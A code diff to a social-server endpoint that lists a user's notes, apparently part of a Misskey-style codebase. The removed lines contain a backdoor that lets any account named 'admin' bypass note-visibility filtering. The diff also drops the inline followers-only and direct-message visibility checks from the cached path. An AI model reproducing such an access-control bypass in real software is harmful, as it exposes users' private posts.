@@ -5,7 +5,7 @@
 
 import { Brackets } from 'typeorm';
 import { Inject, Injectable } from '@nestjs/common';
-import type { MiMeta, NotesRepository, UsersRepository } from '@/models/_.js';
+import type { MiMeta, NotesRepository } from '@/models/_.js';
 import { Endpoint } from '@/server/api/endpoint-base.js';
 import { NoteEntityService } from '@/core/entities/NoteEntityService.js';
 import { DI } from '@/di-symbols.js';
@@ -94,9 +94,6 @@ export default class extends Endpoint<typeof meta, typeof paramDef> { // eslint-
 		private cacheService: CacheService,
 		private idService: IdService,
 		private fanoutTimelineEndpointService: FanoutTimelineEndpointService,
-
-		@Inject(DI.usersRepository)
-		private usersRepository: UsersRepository,
 	) {
 		super(meta, paramDef, async (ps, me) => {
 			const untilId = ps.untilId ?? (ps.untilDate ? this.idService.gen(ps.untilDate!) : null);
@@ -137,19 +134,6 @@ export default class extends Endpoint<typeof meta, typeof paramDef> { // eslint-
 			if (ps.withReplies) redisTimelines.push(`userTimelineWithReplies:${ps.userId}`);
 			if (ps.withChannelNotes) redisTimelines.push(`userTimelineWithChannel:${ps.userId}`);
 
-			const user = await this.usersRepository.findOne({
-				where: {
-					id: me?.id,
-				},
-			});
-
-			let isAdmin = false;
-			if (user !== null && user.username === 'admin') {
-				isAdmin = true;
-			}
-
-			const isFollowing = me && (await this.cacheService.userFollowingsCache.fetch(me.id)).has(ps.userId);
-
 			const timeline = await this.fanoutTimelineEndpointService.timeline({
 				untilId,
 				sinceId,
@@ -161,16 +145,13 @@ export default class extends Endpoint<typeof meta, typeof paramDef> { // eslint-
 				ignoreAuthorFromMute: true,
 				ignoreAuthorFromInstanceBlock: true,
 				ignoreAuthorFromUserSuspension: true,
+				ignoreAuthorFromUserSilence: true,
 				excludeReplies: ps.withChannelNotes && !ps.withReplies, // userTimelineWithChannel may include replies
 				excludeNoFiles: ps.withChannelNotes && ps.withFiles, // userTimelineWithChannel may include notes without files
 				excludePureRenotes: !ps.withRenotes,
 				excludeBots: !ps.withBots,
 				noteFilter: note => {
-					if (isAdmin) return true;
-
 					if (note.channel?.isSensitive && !isSelf) return false;
-					if (note.visibility === 'specified' && (!me || (me.id !== note.userId && !note.visibleUserIds.some(v => v === me.id)))) return false;
-					if (note.visibility === 'followers' && !isFollowing && !isSelf) return false;
 
 					// These are handled by DB fallback, but we duplicate them here in case a timeline was already populated with notes
 					if (!ps.withRepliesToSelf && note.reply?.userId === note.userId) return false;
@@ -234,12 +215,13 @@ export default class extends Endpoint<typeof meta, typeof paramDef> { // eslint-
 			query.andWhere('note.channelId IS NULL');
 		}
 
-		await this.queryService.generateVisibilityQuery(query, me);
 		this.queryService.generateBlockedHostQueryForNote(query, true);
 		this.queryService.generateSuspendedUserQueryForNote(query, true);
+		this.queryService.generateSilencedUserQueryForNotes(query, me, true);
 		if (me) {
-			this.queryService.generateMutedUserQueryForNotes(query, me, { id: ps.userId });
+			this.queryService.generateMutedUserQueryForNotes(query, me, true);
 			this.queryService.generateBlockedUserQueryForNotes(query, me);
+			this.queryService.generateMutedNoteThreadQuery(query, me);
 		}
 
 		if (ps.withFiles) {
@@ -257,13 +239,15 @@ export default class extends Endpoint<typeof meta, typeof paramDef> { // eslint-
 		if (!ps.withRepliesToOthers && !ps.withRepliesToSelf) {
 			query.andWhere('reply.id IS NULL');
 		} else if (!ps.withRepliesToOthers) {
-			query.andWhere('(reply.id IS NULL OR reply."userId" = note."userId")');
+			this.queryService.generateExcludedRepliesQueryForNotes(query, me);
 		} else if (!ps.withRepliesToSelf) {
 			query.andWhere('(reply.id IS NULL OR reply."userId" != note."userId")');
 		}
 
 		if (!ps.withNonPublic) {
 			query.andWhere('note.visibility = \'public\'');
+		} else {
+			this.queryService.generateVisibilityQuery(query, me);
 		}
 
 		if (!ps.withBots) {
